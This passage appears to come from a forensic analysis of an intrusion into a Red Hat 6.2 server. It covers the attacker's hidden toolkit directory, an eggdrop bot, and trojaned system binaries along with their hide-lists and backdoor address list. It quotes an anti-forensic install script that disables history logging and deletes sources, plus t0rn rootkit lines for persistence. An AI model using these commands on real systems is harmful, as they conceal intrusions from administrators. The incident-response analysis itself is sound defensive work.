+120X0Y2'170Y1s2p1r1O1y2E1Q3'202d213a2k312m2Z2E3z2X3n2$3933310D0U0F1u0$1s141Q162h1l2c1Q1K1L261N1W232H1&2c2h3'2t3c2G2M2F`Q070o0a0F0d0G0t0R0r0Q0O1E1'1C282@2q2u2D392G3z2G3P333q2&3q3b3E0R0=0H1i0$1m19131j1Y191X1u2B1B2J1Z2g242T252D2r3g2P2N2S3U2&0j0p0m0l150z1m0V1M0S1S121Y1s1L1m1p1q1R1F2C1R2e1V21212'2'393q461`1P131x1e181t1W1z2o1U2p2`2L202E2b2J
+0T1p131s
+
+# ./decrypt e.conf e.conf.1
+ . . .
+# ./decrypt e.conf.1 e.conf.2
+ . . .
+# ./decrypt e.conf.2 e.conf.3
+# less e.conf.3
+bind filt - "\001ACTION *\001" filt_act
+proc filt_act {idx text} {
+  dccsimul $idx ".me [string trim [lrange $text 1 end] \001]"
+}
+
+bind filt - "/me *" filt_telnet_act
+proc filt_telnet_act {idx text} {
+  dccsimul $idx ".me [lrange $text 1 end]"
+}
+
+# less e.notes
+1K1&2`201h2g2s2P2S1J201R1P2&2n2h2y2E2Q36393f3u2H2@3K3`0o0I0o0g1A1E1Q2b1X1Y2j2D
+1=1=242b1d2i2F2D2S2P2U2Y3D2q3I3N3E462=4m1r2'1W2g1`2f
+0D0G1S1U1=2u2g2r2R2N1H22312=3C2e2n2C3I3D2U3z464f1q1r1V1R0O2f2f2g2E1t2e2V3'2W3h3o3v2C2o3L3J1g1h0v0F0o1v1C1C1T1`1L1y1r1B2b1r
+2'
+
+1G1V2d2`152i2p2v321W1=2'1V29373f2g2D2i2p3s3u3H473V1r1B1J1U2`2e1@2l2p2O
+1U2a232`1f2f2l2T3`2L3k323n3z3H3Z3Y3T441I0q1R1Z1W2b1f2q2l2Y2W30223m
+0R0F1G1W1Z2b2x2F2N2@1N1Y2=373u2u2j2F3C3s2A3J3$421n1B1E1V0T0Q2g252x2K1H1@1L2v2V2Y2X21
+1&
+# ./decrypt e.notes e.notes.1
+ . . .
+# ./decrypt e.notes.1 e.notes.2
+# cat e.notes.2
+bind filt - "\001ACTION *\001" filt_act
+proc filt_act {idx text} {
+  dccsimul $idx ".me [string trim [lrange $text 1 end] \001]"
+}
+
+bind filt - "/me *" filt_telnet_act
+proc filt_telnet_act {idx text} {
+  dccsimul $idx ".me [lrange $text 1 end]"
+}
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+The installation script for this eggdrop bot was later found while
+perusing deleted file space:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+# grep -i " tpack " *
+Binary file 206191.t.txt matches
+Binary file 31733.t.txt matches
+# less `grep -i " tpack " * | awk '{print $3;}'`
+ . . .
+unset HIST
+chmod a-w ~/.bash_history
+./configure --silent
+make eggdrop
+mv eggdrop p
+rm -rf src
+rm install
+gcc encrypt.c -o encrypt
+rm *.c
+rm config*
+rm lush*
+rm Make*
+rm *.h > /dev/null
+rm DEBUG*
+chmod 700 run
+echo " "
+echo "Completed installation of tpack version 2.3"
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+After the eggdrop tar file is loaded, the intruder next appears to unpack
+another tar archive of files into the directory "/t/usr/man/.Ci":
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+Nov 08 00 06:51:53     4096 .a. drwxr-xr-x 1010     users    /t/usr/man/.Ci/ 
+                        118 .a. -rwxr-xr-x 1010     users    /t/usr/man/.Ci/ /Anap
+                         83 .a. -rwxr-xr-x 1010     users    /t/usr/man/.Ci/addps
+                     185988 .a. -rwxr-xr-x 1010     users    /t/usr/man/.Ci/find
+                     147900 .a. -rwxr-xr-x 1010     users    /t/usr/man/.Ci/inetd
+                      12495 .a. -rwxr-xr-x 1010     users    /t/usr/man/.Ci/killall
+                        156 .a. -rwxr-xr-x 1010     users    /t/usr/man/.Ci/needz
+                       4096 .a. drwxr-xr-x 1010     users    /t/usr/man/.Ci/paki
+                       8524 .a. -rwxr-xr-x 1010     users    /t/usr/man/.Ci/paki/slice2
+                       6793 .a. -rw-r--r-- 1010     users    /t/usr/man/.Ci/paki/stream.c
+                      49800 .a. -rwxr-xr-x 1010     users    /t/usr/man/.Ci/pstree
+                     133344 .a. -rwxr-xr-x 1010     users    /t/usr/man/.Ci/q
+                     132785 .a. -rwxr-xr-x 1010     users    /t/usr/man/.Ci/qs
+                       4096 .a. drwxr-xr-x 1010     users    /t/usr/man/.Ci/scan
+                       4096 .a. drwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/amd
+                        114 .a. -rwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/amd/a.sh
+                      12716 .a. -rwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/amd/amdx
+                      13023 .a. -rwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/amd/ben
+                       1455 .a. -rwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/amd/ben.c
+                      15667 .a. -rwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/amd/pscan
+                       4442 .a. -rwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/amd/pscan.c
+                       4096 .a. drwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/bind
+                       1760 .a. -rwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/bind/ibind.sh
+                       3980 .a. -rw-r--r-- 1010     users    /t/usr/man/.Ci/scan/bind/pscan.c
+                       4096 .a. drwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/daemon
+                       5907 .a. -rw------- 1010     users    /t/usr/man/.Ci/scan/daemon/lscan2.c
+                      12392 .a. -rwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/daemon/z0ne
+                       4096 .a. drwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/port
+                       4096 .a. drwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/port/strobe
+                        171 .a. -rw------- 1010     users    /t/usr/man/.Ci/scan/port/strobe/INSTALL
+                       4096 .a. drwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/statd
+                       4390 .a. -rw-r--r-- 1010     users    /t/usr/man/.Ci/scan/statd/classb
+                      19140 .a. -rw-r--r-- 1010     users    /t/usr/man/.Ci/scan/statd/r
+                      21800 .a. -rw-r--r-- 1010     users    /t/usr/man/.Ci/scan/statd/statdx
+                       4096 .a. drwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/wu
+                      26676 .a. -rw-r--r-- 1010     users    /t/usr/man/.Ci/scan/wu/fs
+                      37760 .a. -rw-r--r-- 1010     users    /t/usr/man/.Ci/scan/wu/wu
+                       4096 .a. drwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/x
+                      15092 .a. -rwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/x/pscan
+                       3980 .a. -rw-r--r-- 1010     users    /t/usr/man/.Ci/scan/x/pscan.c
+                      17969 .a. -rwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/x/x
+                       1259 .a. -rwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/x/xfil
+                        385 .a. -rwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/x/xscan
+                       5324 .a. -rwxr-xr-x 1010     users    /t/usr/man/.Ci/sp.pl
+                     350996 .a. -rwxr-xr-x 1010     users    /t/usr/man/.Ci/syslogd
+Nov 08 00 06:51:54      714 ..c -rwxr-xr-x 1010     users    /t/usr/man/.Ci/a.sh
+                       7229 ..c -rwxr-xr-x 1010     users    /t/usr/man/.Ci/snif
+Nov 08 00 06:51:55      698 ..c -rwxr-xr-x 1010     users    /t/usr/man/.Ci/clean
+                     147900 ..c -rwxr-xr-x 1010     users    /t/usr/man/.Ci/inetd
+                      12495 ..c -rwxr-xr-x 1010     users    /t/usr/man/.Ci/killall
+                      49800 ..c -rwxr-xr-x 1010     users    /t/usr/man/.Ci/pstree
+                     133344 ..c -rwxr-xr-x 1010     users    /t/usr/man/.Ci/q
+                     132785 ..c -rwxr-xr-x 1010     users    /t/usr/man/.Ci/qs
+                       4096 ..c drwxr-xr-x 1010     users    /t/usr/man/.Ci/scan
+                       4096 ..c drwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/amd
+                        114 ..c -rwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/amd/a.sh
+                      12716 ..c -rwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/amd/amdx
+                      13023 ..c -rwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/amd/ben
+                       1455 ..c -rwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/amd/ben.c
+                      15667 ..c -rwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/amd/pscan
+                       4442 ..c -rwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/amd/pscan.c
+                       4096 ..c drwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/bind
+                       1760 ..c -rwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/bind/ibind.sh
+                       3980 ..c -rw-r--r-- 1010     users    /t/usr/man/.Ci/scan/bind/pscan.c
+                       4096 ..c drwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/daemon
+                       5907 ..c -rw------- 1010     users    /t/usr/man/.Ci/scan/daemon/lscan2.c
+                      12392 ..c -rwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/daemon/z0ne
+                       4096 ..c drwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/port
+                       4096 ..c drwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/port/strobe
+                        171 ..c -rw------- 1010     users    /t/usr/man/.Ci/scan/port/strobe/INSTALL
+                       1187 ..c -rw------- 1010     users    /t/usr/man/.Ci/scan/port/strobe/Makefile
+                         17 ..c -rw------- 1010     users    /t/usr/man/.Ci/scan/port/strobe/VERSION
+                       3296 ..c -rw------- 1010     users    /t/usr/man/.Ci/scan/port/strobe/strobe.1
+                      17364 ..c -rw------- 1010     users    /t/usr/man/.Ci/scan/port/strobe/strobe.c
+                      39950 ..c -rw------- 1010     users    /t/usr/man/.Ci/scan/port/strobe/strobe.servi
+ces
+                       4096 ..c drwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/statd
+                       4390 ..c -rw-r--r-- 1010     users    /t/usr/man/.Ci/scan/statd/classb
+                      19140 ..c -rw-r--r-- 1010     users    /t/usr/man/.Ci/scan/statd/r
+                      21800 ..c -rw-r--r-- 1010     users    /t/usr/man/.Ci/scan/statd/statdx
+                       4096 ..c drwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/wu
+                      26676 ..c -rw-r--r-- 1010     users    /t/usr/man/.Ci/scan/wu/fs
+                      37760 ..c -rw-r--r-- 1010     users    /t/usr/man/.Ci/scan/wu/wu
+                       4096 ..c drwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/x
+                      15092 ..c -rwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/x/pscan
+                       3980 ..c -rw-r--r-- 1010     users    /t/usr/man/.Ci/scan/x/pscan.c
+                      17969 ..c -rwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/x/x
+                       1259 ..c -rwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/x/xfil
+                        385 ..c -rwxr-xr-x 1010     users    /t/usr/man/.Ci/scan/x/xscan
+                       3098 ..c -rwxr-xr-x 1010     users    /t/usr/man/.Ci/snap
+                       5324 ..c -rwxr-xr-x 1010     users    /t/usr/man/.Ci/sp.pl
+                     350996 ..c -rwxr-xr-x 1010     users    /t/usr/man/.Ci/syslogd
+Nov 08 00 06:51:56     4096 ..c drwxr-xr-x 1010     users    /t/usr/man/.Ci/ 
+                        118 ..c -rwxr-xr-x 1010     users    /t/usr/man/.Ci/ /Anap
+                      12408 ..c -rwxr-xr-x 1010     users    /t/usr/man/.Ci/addn
+                         83 ..c -rwxr-xr-x 1010     users    /t/usr/man/.Ci/addps
+                    1052024 ..c -rwxr-xr-x 1010     users    /t/usr/man/.Ci/bx
+                        699 ..c -rwxr-xr-x 1010     users    /t/usr/man/.Ci/chmod-it
+                        328 ..c -rwxr-xr-x 1010     users    /t/usr/man/.Ci/do
+                     185988 ..c -rwxr-xr-x 1010     users    /t/usr/man/.Ci/find
+                      18535 ..c -rwxr-xr-x 1010     users    /t/usr/man/.Ci/fix
+                        156 ..c -rwxr-xr-x 1010     users    /t/usr/man/.Ci/needz
+                       4096 ..c drwxr-xr-x 1010     users    /t/usr/man/.Ci/paki
+                       8524 ..c -rwxr-xr-x 1010     users    /t/usr/man/.Ci/paki/slice2
+                       6793 ..c -rw-r--r-- 1010     users    /t/usr/man/.Ci/paki/stream.c
+                        188 ..c -rwxr-xr-x 1010     users    /t/usr/man/.Ci/rmS
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+There is a copy of "inetd" found in the .Ci directory, which differs
+from the one being used at the time on the system:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+Nov 08 00 06:51:53   147900 .a. -rwxr-xr-x 1010     users    /t/usr/man/.Ci/inetd
+
+# md5sum /t/usr/sbin/inetd /t/usr/man/.Ci/inetd
+8342cd61eef416974a1e8ac8ad386c86  /t/usr/sbin/inetd
+8fb2bd3f5a575987d40b367a03300f2a  /t/usr/man/.Ci/inetd
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+Strings analysis of the itself shows what may be an embedded
+password, the string "*nazgul*".  This string also appears in a
+regular Red Hat Linux 6.2 installation in the same shared library
+files:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+# find /usr/i486-linux-libc5/ /lib -type f | xargs grep '*nazgul*'
+Binary file /usr/i486-linux-libc5/lib/libc.so.5.3.12 matches
+Binary file /lib/ld.so.1.9.5 matches
+Binary file /lib/ld.so matches
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+These binaries are identical to a clean Red Hat 6.2 system, however:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+# md5sum /lib/ld.so.1.9.5 /t/lib/ld.so.1.9.5 \
+/usr/i486-linux-libc5/lib/libc.so.5.3.12 /t/usr/i486-linux-libc5/lib/libc.so.5.3.12 
+52a2ac83ae3406de9d6c24d29305a75f  /lib/ld.so.1.9.5
+52a2ac83ae3406de9d6c24d29305a75f  /t/lib/ld.so.1.9.5
+b48c539544bda6ed0d2fb06c234fc59d  /usr/i486-linux-libc5/lib/libc.so.5.3.12
+b48c539544bda6ed0d2fb06c234fc59d  /t/usr/i486-linux-libc5/lib/libc.so.5.3.12
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+This appears to be a normal file, not attributable to the intruder.
+(This path of inquiry was dropped.)
+
+Another feature of this inetd is the string "Message Catalog System".
+This is found in several other files on the compromised system:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[root@localhost inetd-req]# find /t -type f | xargs grep -l "Message Catalog System"
+/t/usr/man/.Ci/inetd
+grep: /t/usr/man/.Ci/: Is a directory
+grep: /Anap: No such file or directory
+/t/usr/i486-linux-libc5/lib/libc.so.5.3.12
+/t/lib/ld.so.1.9.5
+/t/lib/ld.so
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+This same string is also found in the "t0rndemon" and "top" replacements
+in the t0rn rootkit (very popularly used in intrusion activity on the
+Internet currently):
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+ . . .
+touch -acmr /usr/sbin/in.telnetd t0rndemon
+mv t0rndemon /usr/sbin/in.inetd
+
+mv .t0rn/sh* /usr/info/.t0rn/
+mv /usr/info/.t0rn/sharsed /usr/sbin/nscd
+/usr/sbin/nscd -q
+echo "# Name Server Cache Daemon..">> /etc/rc.d/rc.sysinit
+echo "/usr/sbin/nscd -q" >> /etc/rc.d/rc.sysinit
+echo " "
+ . . .
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+This may be another red herring (this path of inquiry was dropped.)
+
+Next, the intruder links the / and /root .bash_history files to
+/dev/null (an attempt to disable shell history logging):
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+Nov 08 00 06:52:09        9 m.c lrwxrwxrwx root     root     /t/.bash_history -> /dev/null
+                          9 m.c lrwxrwxrwx root     root     /t/root/.bash_history -> /dev/null
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+[This was later found to be caused by the "install" script.  See
+below.]
+
+The following are just the files and programs in /t/usr/man/.Ci that
+were created or run by the intruder (obtained by using the command
+"grep /usr/man/.Ci body > Ci.body" and running "mactime" against this
+body file subset):
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+Nov 08 00 06:52:10     4096 mac drwxr-xr-x root     root     /t/usr/man/.Ci/backup
+                      42736 mac -rwxr-xr-x root     root     /t/usr/man/.Ci/backup/ifconfig
+                      43024 mac -rwxr-xr-x root     root     /t/usr/man/.Ci/backup/ls
+                      66736 mac -rwxr-xr-x root     root     /t/usr/man/.Ci/backup/netstat
+                      60080 mac -r-xr-xr-x root     root     /t/usr/man/.Ci/backup/ps
+                      23568 mac -rwxr-xr-x root     root     /t/usr/man/.Ci/backup/tcpd
+                      34896 mac -r-xr-xr-x root     root     /t/usr/man/.Ci/backup/top
+                      18535 .a. -rwxr-xr-x 1010     users    /t/usr/man/.Ci/fix
+Nov 08 00 06:52:13     7229 .a. -rwxr-xr-x 1010     users    /t/usr/man/.Ci/snif
+                          5 mac -rw-r--r-- root     root     /t/usr/man/.Ci/sniff.pid
+                          0 mac -rw-r--r-- root     root     /t/usr/man/.Ci/tcp.log
+Nov 08 00 06:52:14      698 .a. -rwxr-xr-x 1010     users    /t/usr/man/.Ci/clean
+Nov 08 00 06:52:15      714 .a. -rwxr-xr-x 1010     users    /t/usr/man/.Ci/a.sh
+Nov 08 00 06:55:47    12408 .a. -rwxr-xr-x 1010     users    /t/usr/man/.Ci/addn
+Nov 08 00 06:55:58      328 .a. -rwxr-xr-x 1010     users    /t/usr/man/.Ci/do
+Nov 08 00 06:56:04     3098 .a. -rwxr-xr-x 1010     users    /t/usr/man/.Ci/snap
+Nov 08 00 06:56:11      188 .a. -rwxr-xr-x 1010     users    /t/usr/man/.Ci/rmS
+Nov 08 00 06:56:25  1052024 .a. -rwxr-xr-x 1010     users    /t/usr/man/.Ci/bx
+Nov 08 00 06:57:00      699 .a. -rwxr-xr-x 1010     users    /t/usr/man/.Ci/chmod-it
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+[Q5] This shows the replacement of the following operating system
+commands with "rootkit" trojan horse versions: "ls", "netstat", "ps",
+"tcpd", and "top".
+
+Running "strings" on the file "/t/bin/ls" shows the rootkit
+configuration file name "/usr/man/r":
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+ . . .
+GNU fileutils-3.13
+vdir
+%s - %s
+/usr/man/r
+//DIRED//
+//SUBDIRED//
+ . . .
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+This file contains the following (these are names of files/directories
+that will be hidden by "ls"):
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+.tp
+tcp.log
+slice2
+.p
+.a
+.l
+scan
+a
+p
+addy.awk
+qd
+imp
+.fakeid
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+Running "strings" on the file "/t/bin/ps" shows the rootkit
+configuration file name "/dev/ptyp":
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+ . . .
+PRQSh
+90t:
+u&Vh
+/dev/ptyp
+NR   PID    STACK      ESP      EIP TMOUT ALARM STAT TTY   TIME COMMAND
+  PID TTY MAJFLT MINFLT   TRS   DRS  SIZE  SWAP   RSS  SHRD   LIB  DT COMMAND
+  PID TTY STAT  TIME  PAGEIN TSIZ DSIZ  RSS   LIM %MEM COMMAND
+  UID   PID SIGNAL   BLOCKED  IGNORED  CATCHED  STAT TTY   TIME COMMAND
+ PPID   PID  PGID   SID TTY TPGID  STAT   UID   TIME COMMAND
+USER       PID %CPU %MEM  SIZE   RSS TTY STAT START   TIME COMMAND
+ FLAGS   UID   PID  PPID PRI  NI   SIZE   RSS WCHAN       STA TTY TIME COMMAND
+  PID TTY STAT  TIME COMMAND
+ . . .
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+This file contains the following (these are names of processes that
+will be hidden by "ps"):
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+2 slice2
+2 snif
+2 pscan
+2 imp
+3 qd
+2 bs.sh
+3 nn
+3 egg.lin
+2 slice2
+2 snif
+2 pscan
+2 imp
+3 qd
+2 bs.sh
+2 telnet
+2 x
+2 xscan
+2 xfil
+2 ssh
+2 p
+2 stream
+2 mstream
+2 amdx
+2 ben
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+Running "strings" on the file "/t/bin/netstat" shows the rootkit
+configuration file "/usr/libexec/awk/addy.awk" embedded in it:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+ . . .
+Linux NET-3 Base Utilities
+Source: net-tools 1.32-alpha net-tools@lina.inka.de (Bernd Eckenfels)
+Kernelsource: 2.0.35
+netstat 1.19 (1996-05-17)
+Fred Baumgarten <dc6iq@insu1.etec.uni-karlsruhe.de> and Alan Cox.
+/usr/libexec/awk/addy.awk
+/dev/route
+netstat
+%s: no support for `%s' on this system.
+Netlink Kernel Messages
+ (continous)
+read /dev/route
+net-tools@lina.inka.de (Bernd Eckenfels)
+netlink message size mismatch
+netstat.c
+ . . .
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+This file contains:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+1 65.1
+2 65.1
+1 134518464.134518444
+2 134518464.134518444
+1 216.149
+2 216.149
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+The netblock 65.1 is one of several @Home netblocks.  The netblock
+216.149 is owned by Nine Net Avenue, Inc.:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+@Home Network (NETBLK-HOME-3BLK)HOME-3BLK             65.0.0.0 - 65.15.255.255
+@Home Network (NETBLK-SRSTFL1-FL-2) SRSTFL1-FL-2        65.1.0.0 - 65.1.15.255
+@Home Network (NETBLK-NWORLA1-LA-3) NWORLA1-LA-3       65.1.16.0 - 65.1.31.255
+@Home Network (NETBLK-NSVLTN1-TN-2) NSVLTN1-TN-2       65.1.32.0 - 65.1.47.255
+@Home Network (NETBLK-ATLNGA1-GA-2) ATLNGA1-GA-2       65.1.48.0 - 65.1.63.255
+@Home Network (NETBLK-SRSTFL1-FL-3) SRSTFL1-FL-3       65.1.64.0 - 65.1.79.255
+@Home Network (NETBLK-GNVLSC1-SC-2) GNVLSC1-SC-2       65.1.80.0 - 65.1.95.255
+@Home Network (NETBLK-NSVLTN1-TN-3) NSVLTN1-TN-3      65.1.96.0 - 65.1.127.255
+@Home Network (NETBLK-WASHDC1-DC-1) WASHDC1-DC-1     65.1.128.0 - 65.1.143.255
+@Home Network (NETBLK-PHLAPA1-PA-4) PHLAPA1-PA-4     65.1.144.0 - 65.1.159.255
+@Home Network (NETBLK-BLTMMD1-MD-5) BLTMMD1-MD-5     65.1.160.0 - 65.1.175.255
+@Home Network (NETBLK-NRFLVA1-VA-1) NRFLVA1-VA-1     65.1.176.0 - 65.1.191.255
+@Home Network (NETBLK-NRFLVA1-VA-2) NRFLVA1-VA-2     65.1.192.0 - 65.1.207.255
+@Home Network (NETBLK-BLTMMD1-MD-6) BLTMMD1-MD-6     65.1.208.0 - 65.1.223.255
+@Home Network (NETBLK-PITBPA1-PA-2) PITBPA1-PA-2     65.1.224.0 - 65.1.229.255
+@Home Network (NETBLK-PITBPA1-PA-4) PITBPA1-PA-4     65.1.230.0 - 65.1.239.255
+@Home Network (NETBLK-WASHDC1-DC-2) WASHDC1-DC-2     65.1.240.0 - 65.1.255.255
+
+9 Net Avenue, Inc. (NETBLK-NINENETAVE-1) NINENETAVE-1
+                                                 216.149.0.0 - 216.149.255.255
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+Running "strings" on the file "/t/bin/tcpd" shows the rootkit
+configuration file name "/usr/man/.a":
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+ . . .
+PRhD
+>%uZ
+/usr/man/.a
+/usr/sbin
+%s/%s
+connect from %s
+error: cannot execute %s: %m
+/etc/hosts.allow
+/etc/hosts.deny
+ . . .
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+This file contains the following (which provides a backdoor through
+tcpd to these IP addresses and ports):
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+1 63.203
+2 63.203
+1 209.250
+2 209.250
+3 113
+4 113
+3 35350
+4 35350
+1 216.33
+2 216.33
+1 63.206
+2 63.206
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+Running "strings" on the file "/t/usr/bin/top" shows the rootkit
+configuration file name "/dev/ptyp":
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+ . . .
+User Name
+User Id
+Parent Process Id
+Process Id
+/dev/ptyp
+Wrong configuration option %c
+/etc/toprc
+HOME
+HOME
+.toprc
+ . . .
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+This file contains the following (these are names of processes that
+will be hidden by "top"):
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+2 slice2
+2 snif
+2 pscan
+2 imp
+3 qd
+2 bs.sh
+3 nn
+3 egg.lin
+2 slice2
+2 snif
+2 pscan
+2 imp
+3 qd
+2 bs.sh
+2 telnet
+2 x
+2 xscan
+2 xfil
+2 ssh
+2 p
+2 stream
+2 mstream
+2 amdx
+2 ben
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+[Q4] The program "snif" is the standard linsniff sniffer.  It was run,
